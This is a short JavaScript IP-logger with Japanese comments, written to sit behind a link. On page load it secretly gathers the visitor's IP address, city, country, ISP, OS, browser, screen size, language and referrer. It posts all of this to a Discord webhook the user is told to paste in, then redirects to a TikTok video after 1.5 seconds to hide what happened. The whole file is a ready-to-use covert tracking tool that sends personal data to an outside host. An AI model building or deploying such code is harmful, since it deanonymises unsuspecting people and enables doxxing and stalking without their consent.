const WEBHOOK_URL = ""; // ここにWebhook URLを貼る
const REDIRECT_URL = "https://www.tiktok.com/@sakonji_jrfv/video/7625181468586790162?is_from_webapp=1&sender_device=pc&web_id=7621142624386418184";

async function track() {
    try {
        // 1. IPと詳細な場所情報を取得
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        
        // 2. ブラウザから取得できる詳細情報
        const details = {
            os: navigator.platform,
            browser: navigator.userAgent,
            language: navigator.language,
            screenSize: `${window.screen.width}x${window.screen.height}`,
            referrer: document.referrer || "直接アクセス",
            localTime: new Date().toLocaleString('ja-JP')
        };

        // 3. Discordに送信
        if (WEBHOOK_URL) {
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    embeds: [{
                        title: "📊 詳細アクセスログ",
                        color: 15418782,
                        fields: [
                            { name: "🌐 IPアドレス", value: data.ip || "取得失敗", inline: true },
                            { name: "📍 場所", value: `${data.country_name} / ${data.city}`, inline: true },
                            { name: "🏢 プロバイダ", value: data.org || "取得失敗" },
                            { name: "📱 デバイス/OS", value: details.os, inline: true },
                            { name: "🖥️ 画面解像度", value: details.screenSize, inline: true },
                            { name: "🌍 ブラウザ言語", value: details.language, inline: true },
                            { name: "🔗 参照元", value: details.referrer },
                            { name: "🕒 現地時刻", value: details.localTime },
                            { name: "ℹ️ ブラウザ詳細", value: `\`\`\`${details.browser}\`\`\`` }
                        ],
                        timestamp: new Date().toISOString()
                    }]
                })
            });
        }
    } catch (e) {
        console.error("Tracking error:", e);
    }

    // 1.5秒後にTikTokへリダイレクト
    setTimeout(() => {
        window.location.href = REDIRECT_URL;
    }, 1500);
}

track();
